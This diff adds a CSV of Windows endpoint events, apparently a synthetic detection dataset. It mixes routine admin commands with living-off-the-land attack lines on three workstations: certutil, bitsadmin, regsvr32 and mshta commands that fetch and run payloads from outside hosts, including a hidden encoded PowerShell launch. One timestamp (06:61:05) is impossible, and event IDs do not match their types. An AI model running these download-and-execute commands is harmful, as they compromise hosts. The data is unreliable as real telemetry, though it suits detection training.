@@ -1,0 +1,146 @@
+timestamp,host,user,event_id,event_type,parent_process,process_name,command_line,dest_ip,dest_port,bytes_out,status
+2026-03-09T06:03:00,SRV-FILE-01,admin_svc,3,ProcessTerminate,explorer.exe,bitsadmin.exe,/list /allusers,10.0.0.142,445,46205,success
+2026-03-09T06:05:00,WKSTN-14,admin_svc,3,NetworkConnect,explorer.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.0.182,,4358,success
+2026-03-09T06:06:00,WKSTN-01,rgreen,11,ProcessCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.3.227,,38227,success
+2026-03-09T06:06:00,SRV-FILE-01,rgreen,11,ProcessTerminate,svchost.exe,certutil.exe,-store My,10.0.0.248,445,23512,success
+2026-03-09T06:07:00,WKSTN-08,svc_backup,5,NetworkConnect,services.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.1.91,445,22804,success
+2026-03-09T06:08:00,WKSTN-02,dlopez,5,FileCreate,explorer.exe,bitsadmin.exe,/list /allusers,10.0.5.60,445,41463,success
+2026-03-09T06:09:00,WKSTN-05,kpatel,1,ProcessCreate,cmd.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.4.35,135,30229,success
+2026-03-09T06:11:00,WKSTN-01,dlopez,3,ProcessTerminate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.5.114,3389,46746,success
+2026-03-09T06:14:00,WKSTN-02,admin_svc,1,ProcessCreate,services.exe,certutil.exe,-store My,10.0.0.251,3389,8741,success
+2026-03-09T06:14:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://185.220.101.45/update.exe C:\Windows\Temp\update.exe,185.220.101.45,80,1113912,success
+2026-03-09T06:14:12,WKSTN-07,jsmith,3,NetworkConnect,,certutil.exe,,185.220.101.45,80,26663,success
+2026-03-09T06:15:00,SRV-FILE-01,dlopez,1,ProcessCreate,services.exe,wuauclt.exe,/detectnow,10.0.4.236,3389,10817,success
+2026-03-09T06:15:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://185.220.101.45/stage2.ps1 C:\Users\jsmith\AppData\Roaming\stage2.ps1,185.220.101.45,80,389805,success
+2026-03-09T06:15:00,WKSTN-02,svc_backup,5,ProcessTerminate,services.exe,net.exe,net user /domain,10.0.0.120,,20428,success
+2026-03-09T06:15:00,WKSTN-02,svc_backup,11,FileCreate,explorer.exe,taskmgr.exe,,10.0.4.98,135,886,success
+2026-03-09T06:15:03,WKSTN-07,jsmith,3,NetworkConnect,,certutil.exe,,185.220.101.45,80,25622,success
+2026-03-09T06:17:00,WKSTN-01,svc_backup,5,ProcessCreate,cmd.exe,certutil.exe,-store My,10.0.2.172,135,14540,success
+2026-03-09T06:17:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -decode C:\Users\jsmith\AppData\Roaming\encoded.txt C:\Windows\Temp\payload.exe,,,,success
+2026-03-09T06:23:00,WKSTN-08,dlopez,11,ProcessTerminate,svchost.exe,robocopy.exe,C:\data \\fileserver\backup /MIR,10.0.5.27,443,22114,success
+2026-03-09T06:23:00,SRV-WEB-01,mturner,1,NetworkConnect,cmd.exe,robocopy.exe,C:\data \\fileserver\backup /MIR,10.0.5.109,3389,4663,success
+2026-03-09T06:27:00,WKSTN-14,kpatel,5,ProcessTerminate,services.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.4.252,3389,8078,success
+2026-03-09T06:32:00,WKSTN-01,dlopez,5,ProcessCreate,svchost.exe,taskmgr.exe,,10.0.1.175,443,44208,success
+2026-03-09T06:32:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /transfer myJob /download /priority HIGH http://198.51.100.77/rat.exe C:\Windows\Temp\rat.exe,198.51.100.77,80,342632,success
+2026-03-09T06:32:08,WKSTN-12,bwilson,3,NetworkConnect,,svchost.exe,,198.51.100.77,80,59123,success
+2026-03-09T06:33:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /create myJob,,,,success
+2026-03-09T06:33:00,SRV-FILE-01,admin_svc,11,NetworkConnect,services.exe,wuauclt.exe,/detectnow,10.0.3.49,80,6852,success
+2026-03-09T06:34:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /addfile myJob http://198.51.100.77/config.dat C:\ProgramData\config.dat,198.51.100.77,80,1594492,success
+2026-03-09T06:44:00,WKSTN-14,mturner,3,ProcessCreate,services.exe,certutil.exe,-store My,10.0.3.177,3389,31296,success
+2026-03-09T06:45:00,SRV-FILE-01,dlopez,11,NetworkConnect,svchost.exe,cmd.exe,ipconfig /all,10.0.1.202,,7584,success
+2026-03-09T06:47:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://192.0.2.88/tools.zip C:\Windows\Temp\tools.zip,192.0.2.88,80,2487113,success
+2026-03-09T06:48:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -urlcache -split -f http://185.220.101.45/beacon.exe C:\Windows\Temp\svchost32.exe,185.220.101.45,80,2234301,success
+2026-03-09T06:48:00,WKSTN-14,admin_svc,3,ProcessCreate,svchost.exe,outlook.exe,/recycle,10.0.3.88,3389,18009,success
+2026-03-09T06:54:00,WKSTN-14,dlopez,3,ProcessTerminate,explorer.exe,wuauclt.exe,/detectnow,10.0.1.95,445,10838,success
+2026-03-09T06:61:05,WKSTN-03,areyes,3,NetworkConnect,,mshta.exe,,192.0.2.55,80,124629,success
+2026-03-09T07:00:33,WKSTN-07,jsmith,3,NetworkConnect,,regsvr32.exe,,192.0.2.55,80,131981,success
+2026-03-09T07:01:00,WKSTN-03,areyes,1,ProcessCreate,explorer.exe,mshta.exe,mshta.exe http://192.0.2.55/payload.hta,192.0.2.55,80,76482,success
+2026-03-09T07:02:00,WKSTN-03,areyes,1,ProcessCreate,explorer.exe,mshta.exe,"mshta.exe vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -nop -w hidden -enc JABzAD..."""",0,True)(window.close)""",,,,success
+2026-03-09T07:03:00,WKSTN-02,rgreen,11,NetworkConnect,services.exe,ping.exe,ping -n 4 8.8.8.8,10.0.1.72,135,16871,success
+2026-03-09T07:04:00,SRV-WEB-01,mturner,11,ProcessCreate,explorer.exe,taskmgr.exe,,10.0.2.58,,4996,success
+2026-03-09T07:05:00,WKSTN-03,areyes,1,ProcessCreate,explorer.exe,mshta.exe,mshta.exe C:\Users\areyes\AppData\Local\Temp\dropper.hta,,,,success
+2026-03-09T07:06:00,WKSTN-08,dlopez,3,FileCreate,svchost.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.2.195,135,18735,success
+2026-03-09T07:07:00,WKSTN-02,rgreen,5,FileCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.2.57,443,33892,success
+2026-03-09T07:08:00,WKSTN-01,rgreen,5,NetworkConnect,services.exe,outlook.exe,/recycle,10.0.3.227,,30571,success
+2026-03-09T07:09:00,WKSTN-14,admin_svc,11,FileCreate,explorer.exe,outlook.exe,/recycle,10.0.4.11,135,48638,success
+2026-03-09T07:12:00,WKSTN-14,helpdesk1,5,ProcessCreate,cmd.exe,net.exe,net user /domain,10.0.5.80,443,13550,success
+2026-03-09T07:12:00,SRV-FILE-01,dlopez,11,NetworkConnect,services.exe,cmd.exe,ipconfig /all,10.0.4.124,445,22286,success
+2026-03-09T07:13:00,WKSTN-08,helpdesk1,11,NetworkConnect,cmd.exe,notepad.exe,C:\Users\rgreen\Desktop\notes.txt,10.0.2.56,80,38457,success
+2026-03-09T07:15:00,SRV-WEB-01,helpdesk1,5,NetworkConnect,explorer.exe,wuauclt.exe,/detectnow,10.0.0.170,443,19465,success
+2026-03-09T07:16:00,SRV-WEB-01,kpatel,11,NetworkConnect,services.exe,chrome.exe,--type=renderer,10.0.1.70,135,32327,success
+2026-03-09T07:27:00,WKSTN-02,mturner,5,FileCreate,explorer.exe,notepad.exe,C:\Users\rgreen\Desktop\notes.txt,10.0.0.103,135,5355,success
+2026-03-09T07:28:00,WKSTN-14,kpatel,5,ProcessCreate,svchost.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.0.218,135,32625,success
+2026-03-09T07:30:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /transfer stealthJob /download /priority FOREGROUND http://203.0.113.99/svch0st.exe C:\Windows\System32\svch0st.exe,203.0.113.99,80,264947,success
+2026-03-09T07:30:00,WKSTN-08,kpatel,11,ProcessCreate,explorer.exe,taskmgr.exe,,10.0.0.104,,22736,success
+2026-03-09T07:30:00,WKSTN-02,helpdesk1,5,ProcessCreate,cmd.exe,chrome.exe,--type=renderer,10.0.4.187,443,11208,success
+2026-03-09T07:30:00,SRV-WEB-01,admin_svc,11,NetworkConnect,cmd.exe,ping.exe,ping -n 4 8.8.8.8,10.0.1.250,443,27520,success
+2026-03-09T07:31:00,SRV-WEB-01,dlopez,5,ProcessCreate,services.exe,ping.exe,ping -n 4 8.8.8.8,10.0.4.32,135,5664,success
+2026-03-09T07:31:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /SetNotifyCmdLine stealthJob C:\Windows\Temp\rat.exe NULL,,,,success
+2026-03-09T07:33:00,WKSTN-08,mturner,5,ProcessTerminate,explorer.exe,msiexec.exe,/i C:\Installers\office.msi /quiet,10.0.5.231,445,33734,success
+2026-03-09T07:33:00,SRV-FILE-01,rgreen,1,ProcessTerminate,svchost.exe,mmc.exe,devmgmt.msc,10.0.5.107,443,13659,success
+2026-03-09T07:33:00,WKSTN-01,svc_backup,11,ProcessCreate,svchost.exe,wuauclt.exe,/detectnow,10.0.4.32,135,24655,success
+2026-03-09T07:35:00,WKSTN-08,rgreen,3,FileCreate,cmd.exe,chrome.exe,--type=renderer,10.0.1.45,80,40443,success
+2026-03-09T07:37:00,WKSTN-05,helpdesk1,3,ProcessTerminate,explorer.exe,notepad.exe,C:\Users\rgreen\Desktop\notes.txt,10.0.1.211,80,21173,success
+2026-03-09T07:37:00,WKSTN-14,kpatel,5,ProcessCreate,explorer.exe,outlook.exe,/recycle,10.0.5.227,3389,49709,success
+2026-03-09T07:37:00,WKSTN-14,dlopez,5,ProcessTerminate,explorer.exe,certutil.exe,-store My,10.0.5.102,445,1030,success
+2026-03-09T07:38:00,SRV-FILE-01,rgreen,3,ProcessCreate,services.exe,certutil.exe,-store My,10.0.3.85,3389,31034,success
+2026-03-09T07:39:00,WKSTN-05,helpdesk1,11,NetworkConnect,services.exe,cmd.exe,ipconfig /all,10.0.1.252,3389,35504,success
+2026-03-09T07:42:00,SRV-FILE-01,svc_backup,5,ProcessCreate,explorer.exe,xcopy.exe,/E /I C:\deploy \\WKSTN-20\deploy,10.0.2.46,3389,17897,success
+2026-03-09T07:44:00,SRV-WEB-01,helpdesk1,3,ProcessCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.2.87,3389,45897,success
+2026-03-09T07:50:00,WKSTN-05,helpdesk1,11,NetworkConnect,services.exe,ping.exe,ping -n 4 8.8.8.8,10.0.1.188,3389,43128,success
+2026-03-09T07:53:00,SRV-WEB-01,svc_backup,1,ProcessCreate,explorer.exe,net.exe,net user /domain,10.0.0.238,443,11399,success
+2026-03-09T07:53:00,WKSTN-02,helpdesk1,5,ProcessCreate,explorer.exe,ping.exe,ping -n 4 8.8.8.8,10.0.2.204,80,19726,success
+2026-03-09T07:55:00,WKSTN-05,svc_backup,3,ProcessTerminate,services.exe,robocopy.exe,C:\data \\fileserver\backup /MIR,10.0.5.62,445,29327,success
+2026-03-09T07:57:00,WKSTN-05,svc_backup,1,ProcessCreate,services.exe,bitsadmin.exe,/list /allusers,10.0.4.145,80,5301,success
+2026-03-09T07:58:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -verifyctl -f http://203.0.113.77/check.html,203.0.113.77,80,2052427,success
+2026-03-09T07:59:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,certutil.exe,certutil.exe -decode C:\Users\jsmith\Desktop\blob.b64 C:\Windows\Temp\out.exe,,,,success
+2026-03-09T08:00:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,regsvr32.exe,regsvr32.exe /s /n /u /i:http://192.0.2.55/payload.sct scrobj.dll,192.0.2.55,80,22349,success
+2026-03-09T08:02:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,regsvr32.exe,regsvr32.exe /s /n /u /i:http://203.0.113.77/update.sct scrobj.dll,203.0.113.77,80,16825,success
+2026-03-09T08:04:00,WKSTN-08,rgreen,11,ProcessCreate,cmd.exe,taskmgr.exe,,10.0.3.1,135,17880,success
+2026-03-09T08:04:00,WKSTN-07,jsmith,1,ProcessCreate,cmd.exe,regsvr32.exe,regsvr32.exe /s C:\Windows\Temp\mal.dll,,,,success
+2026-03-09T08:06:00,WKSTN-01,rgreen,5,ProcessCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.0.135,135,1505,success
+2026-03-09T08:08:00,SRV-WEB-01,rgreen,1,ProcessTerminate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.1.96,443,35848,success
+2026-03-09T08:10:00,SRV-FILE-01,dlopez,11,FileCreate,services.exe,bitsadmin.exe,/list /allusers,10.0.1.117,3389,9979,success
+2026-03-09T08:10:00,WKSTN-01,svc_backup,3,ProcessCreate,explorer.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.5.221,443,26961,success
+2026-03-09T08:21:00,WKSTN-08,mturner,3,ProcessCreate,services.exe,cmd.exe,ipconfig /all,10.0.0.166,443,33161,success
+2026-03-09T08:22:00,SRV-WEB-01,rgreen,11,FileCreate,services.exe,robocopy.exe,C:\data \\fileserver\backup /MIR,10.0.0.24,445,15022,success
+2026-03-09T08:23:00,WKSTN-01,mturner,1,NetworkConnect,explorer.exe,taskmgr.exe,,10.0.2.150,3389,10205,success
+2026-03-09T08:24:00,WKSTN-02,kpatel,5,ProcessTerminate,cmd.exe,ping.exe,ping -n 4 8.8.8.8,10.0.4.156,,47578,success
+2026-03-09T08:25:00,WKSTN-14,mturner,1,NetworkConnect,cmd.exe,bitsadmin.exe,/list /allusers,10.0.2.170,80,10792,success
+2026-03-09T08:29:00,WKSTN-08,svc_backup,5,ProcessCreate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.3.7,3389,37292,success
+2026-03-09T08:30:00,WKSTN-12,bwilson,1,ProcessCreate,powershell.exe,bitsadmin.exe,bitsadmin /resume stealthJob,,,,success
+2026-03-09T08:34:00,WKSTN-01,admin_svc,3,FileCreate,cmd.exe,xcopy.exe,/E /I C:\deploy \\WKSTN-20\deploy,10.0.3.151,445,925,success
+2026-03-09T08:34:00,WKSTN-05,mturner,1,NetworkConnect,explorer.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.5.211,445,38264,success
+2026-03-09T08:35:00,WKSTN-14,svc_backup,3,FileCreate,services.exe,taskmgr.exe,,10.0.3.77,3389,28603,success
+2026-03-09T08:37:00,SRV-WEB-01,admin_svc,11,FileCreate,services.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.5.152,445,21622,success
+2026-03-09T08:37:00,WKSTN-14,dlopez,11,ProcessCreate,svchost.exe,wmic.exe,process list brief,10.0.2.54,135,38509,success
+2026-03-09T08:38:00,WKSTN-01,rgreen,5,NetworkConnect,explorer.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.3.251,80,42033,success
+2026-03-09T08:38:00,SRV-FILE-01,rgreen,11,NetworkConnect,cmd.exe,outlook.exe,/recycle,10.0.3.164,445,30618,success
+2026-03-09T08:38:00,WKSTN-05,helpdesk1,3,ProcessCreate,explorer.exe,msiexec.exe,/i C:\Installers\office.msi /quiet,10.0.2.202,135,2686,success
+2026-03-09T08:41:00,SRV-FILE-01,mturner,3,NetworkConnect,svchost.exe,mmc.exe,devmgmt.msc,10.0.0.64,80,37073,success
+2026-03-09T08:43:00,SRV-WEB-01,svc_backup,11,ProcessCreate,explorer.exe,schtasks.exe,/query /fo LIST /v,10.0.4.73,135,31873,success
+2026-03-09T08:43:00,WKSTN-08,helpdesk1,5,FileCreate,svchost.exe,bitsadmin.exe,/list /allusers,10.0.1.99,135,7489,success
+2026-03-09T08:46:00,WKSTN-01,svc_backup,5,FileCreate,svchost.exe,outlook.exe,/recycle,10.0.5.184,135,35956,success
+2026-03-09T08:47:00,WKSTN-05,kpatel,11,FileCreate,cmd.exe,regsvr32.exe,C:\Windows\System32\shell32.dll,10.0.4.122,,11620,success
+2026-03-09T08:48:00,WKSTN-08,admin_svc,3,ProcessTerminate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.1.238,3389,49997,success
+2026-03-09T08:49:00,SRV-WEB-01,rgreen,11,ProcessCreate,cmd.exe,mmc.exe,devmgmt.msc,10.0.5.39,445,9821,success
+2026-03-09T08:50:00,WKSTN-01,svc_backup,11,ProcessTerminate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.0.114,445,39007,success
+2026-03-09T08:50:00,WKSTN-08,dlopez,11,ProcessTerminate,cmd.exe,bitsadmin.exe,/list /allusers,10.0.1.108,,25347,success
+2026-03-09T08:55:00,SRV-FILE-01,svc_backup,5,FileCreate,svchost.exe,msiexec.exe,/i C:\Installers\office.msi /quiet,10.0.0.24,,28259,success
+2026-03-09T08:57:00,WKSTN-02,dlopez,5,FileCreate,svchost.exe,outlook.exe,/recycle,10.0.3.191,3389,22178,success
+2026-03-09T08:57:00,WKSTN-08,dlopez,11,ProcessCreate,services.exe,taskmgr.exe,,10.0.0.81,445,21686,success
+2026-03-09T08:58:00,WKSTN-08,dlopez,5,NetworkConnect,cmd.exe,wmic.exe,process list brief,10.0.2.27,80,25398,success
+2026-03-09T08:59:00,WKSTN-08,dlopez,5,ProcessTerminate,cmd.exe,chrome.exe,--type=renderer,10.0.0.185,443,21179,success
+2026-03-09T09:00:00,WKSTN-03,areyes,1,ProcessCreate,explorer.exe,mshta.exe,"mshta.exe javascript:a=(GetObject(""script:http://192.0.2.55/stage2.sct"")).Exec();close();",192.0.2.55,80,16395,success
+2026-03-09T09:02:00,WKSTN-05,kpatel,5,FileCreate,services.exe,msiexec.exe,/i C:\Installers\office.msi /quiet,10.0.0.64,443,4696,success
+2026-03-09T09:02:00,WKSTN-05,rgreen,5,ProcessTerminate,svchost.exe,net.exe,net user /domain,10.0.4.21,443,10384,success
+2026-03-09T09:03:00,WKSTN-02,mturner,3,ProcessCreate,svchost.exe,outlook.exe,/recycle,10.0.5.154,80,37588,success
+2026-03-09T09:03:00,SRV-FILE-01,kpatel,11,FileCreate,cmd.exe,msiexec.exe,/i C:\Installers\office.msi /quiet,10.0.1.168,,863,success
+2026-03-09T09:10:00,WKSTN-14,svc_backup,3,NetworkConnect,cmd.exe,ping.exe,ping -n 4 8.8.8.8,10.0.5.124,445,47986,success
+2026-03-09T09:13:00,WKSTN-08,helpdesk1,11,ProcessCreate,cmd.exe,regsvr32.exe,C:\Windows\System32\shell32.dll,10.0.2.141,443,19376,success
+2026-03-09T09:13:00,WKSTN-01,rgreen,3,ProcessCreate,cmd.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.1.33,135,44373,success
+2026-03-09T09:14:00,WKSTN-14,admin_svc,5,ProcessCreate,cmd.exe,mmc.exe,devmgmt.msc,10.0.2.59,445,12259,success
+2026-03-09T09:15:00,SRV-WEB-01,rgreen,11,FileCreate,svchost.exe,powershell.exe,Get-Process | Where-Object {$_.CPU -gt 10},10.0.1.150,135,42101,success
+2026-03-09T09:15:00,WKSTN-14,kpatel,11,ProcessTerminate,cmd.exe,wuauclt.exe,/detectnow,10.0.5.62,3389,25598,success
+2026-03-09T09:16:00,SRV-FILE-01,dlopez,1,ProcessTerminate,services.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.1.117,80,47823,success
+2026-03-09T09:17:00,WKSTN-08,svc_backup,1,FileCreate,services.exe,ping.exe,ping -n 4 8.8.8.8,10.0.0.49,3389,24209,success
+2026-03-09T09:19:00,SRV-WEB-01,rgreen,5,ProcessCreate,explorer.exe,ping.exe,ping -n 4 8.8.8.8,10.0.2.148,,25096,success
+2026-03-09T09:19:00,WKSTN-08,rgreen,3,FileCreate,explorer.exe,ping.exe,ping -n 4 8.8.8.8,10.0.4.64,80,30414,success
+2026-03-09T09:21:00,WKSTN-14,dlopez,5,NetworkConnect,svchost.exe,schtasks.exe,/query /fo LIST /v,10.0.3.248,445,49426,success
+2026-03-09T09:25:00,WKSTN-01,kpatel,1,NetworkConnect,cmd.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.5.186,,26544,success
+2026-03-09T09:25:00,WKSTN-08,helpdesk1,5,FileCreate,services.exe,schtasks.exe,/query /fo LIST /v,10.0.4.115,443,49236,success
+2026-03-09T09:32:00,WKSTN-01,dlopez,11,NetworkConnect,services.exe,certutil.exe,-store My,10.0.4.157,,25337,success
+2026-03-09T09:33:00,WKSTN-14,helpdesk1,5,ProcessCreate,svchost.exe,notepad.exe,C:\Users\rgreen\Desktop\notes.txt,10.0.5.27,443,17832,success
+2026-03-09T09:38:00,WKSTN-02,svc_backup,1,FileCreate,svchost.exe,net.exe,net user /domain,10.0.3.163,445,11159,success
+2026-03-09T09:39:00,SRV-WEB-01,kpatel,1,ProcessTerminate,services.exe,certutil.exe,-store My,10.0.5.234,135,25802,success
+2026-03-09T09:41:00,SRV-FILE-01,svc_backup,1,FileCreate,svchost.exe,mmc.exe,devmgmt.msc,10.0.1.156,445,14852,success
+2026-03-09T09:43:00,WKSTN-01,svc_backup,11,NetworkConnect,cmd.exe,outlook.exe,/recycle,10.0.3.90,445,15415,success
+2026-03-09T09:45:00,SRV-FILE-01,kpatel,1,ProcessCreate,cmd.exe,notepad.exe,C:\Users\rgreen\Desktop\notes.txt,10.0.5.41,445,36599,success
+2026-03-09T09:45:00,WKSTN-14,helpdesk1,5,ProcessCreate,cmd.exe,certutil.exe,-hashfile C:\Windows\System32\notepad.exe SHA256,10.0.0.62,,27135,success
+2026-03-09T09:47:00,WKSTN-14,rgreen,1,ProcessCreate,services.exe,ping.exe,ping -n 4 8.8.8.8,10.0.5.150,3389,34761,success
+2026-03-09T09:47:00,WKSTN-01,helpdesk1,3,ProcessTerminate,svchost.exe,ping.exe,ping -n 4 8.8.8.8,10.0.4.54,,22971,success
+2026-03-09T09:50:00,WKSTN-14,rgreen,5,ProcessCreate,services.exe,outlook.exe,/recycle,10.0.0.134,3389,45513,success
+2026-03-09T09:52:00,WKSTN-08,admin_svc,1,ProcessCreate,services.exe,cmd.exe,ipconfig /all,10.0.1.222,135,12409,success
+2026-03-09T09:54:00,WKSTN-14,rgreen,1,FileCreate,svchost.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.5.105,80,9660,success
+2026-03-09T09:55:00,WKSTN-01,admin_svc,5,FileCreate,explorer.exe,xcopy.exe,/E /I C:\deploy \\WKSTN-20\deploy,10.0.0.238,445,20653,success
+2026-03-09T09:59:00,WKSTN-05,rgreen,5,NetworkConnect,svchost.exe,explorer.exe,C:\Users\mturner\Documents\report.xlsx,10.0.3.34,,42803,success
